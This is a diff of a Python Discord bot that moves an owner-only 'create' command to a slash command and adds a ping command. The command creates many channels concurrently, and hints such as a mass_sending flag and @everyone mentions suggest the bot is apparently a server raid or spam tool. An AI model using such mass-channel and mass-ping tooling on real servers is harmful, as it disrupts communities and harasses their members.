@@ -1,5 +1,6 @@
 import discord
 from discord.ext import commands
+from discord import app_commands
 import asyncio
 import time
 import os
@@ -25,26 +26,35 @@ mass_sending = False
 bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)
 
 
-@bot.command()
-async def create(ctx, channel_name: str, amount: int):
-    if ctx.author.id == owner_id:
+
+
+@bot.tree.command()
+@app_commands.describe(name="What name for the channels", amount= "How many channels to create")
+async def create(interaction: discord.Interaction, name: str, amount: int):
+    if interaction.user.id == owner_id:
         start_time = time.time()
         allow_mentions = discord.AllowedMentions(everyone=True)
-        guild = ctx.message.guild
+        guild = interaction.guild
 
         async def create_channel():
-            channel = await guild.create_text_channel(channel_name)  # Use static name
+            await guild.create_text_channel(name)
 
         # Create a list of tasks for creating channels
         tasks = [create_channel() for _ in range(amount)]
         
         # Run all tasks concurrently
         await asyncio.gather(*tasks)
-        print(f"Created {amount} channels named '{channel_name}'.")
+
+        end_time = time.time()
+        duration = end_time - start_time
+        
+        await interaction.response.send_message(f"Created {amount} channels named '{name}' in {duration:.2f} seconds.")
     else:
-        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")
-    end_time = time.time()
-    duration = end_time - start_time
+        await interaction.response.send_message("This command's power is a tempest, beyond mortal comprehension.")
+
+@bot.hybrid_command()
+async def ping(ctx):
+    await ctx.send('Pong!')
 
 @bot.command()
 async def remove(ctx, prefix: str):
@@ -450,6 +460,7 @@ async def admin_list(ctx):
 async def on_ready():   
     print(f'Bot is ready as {bot.user}')
     await bot.change_presence(status=discord.Status.online)
+    await bot.tree.sync()
 
 @bot.event
 async def on_member_update(before, after):
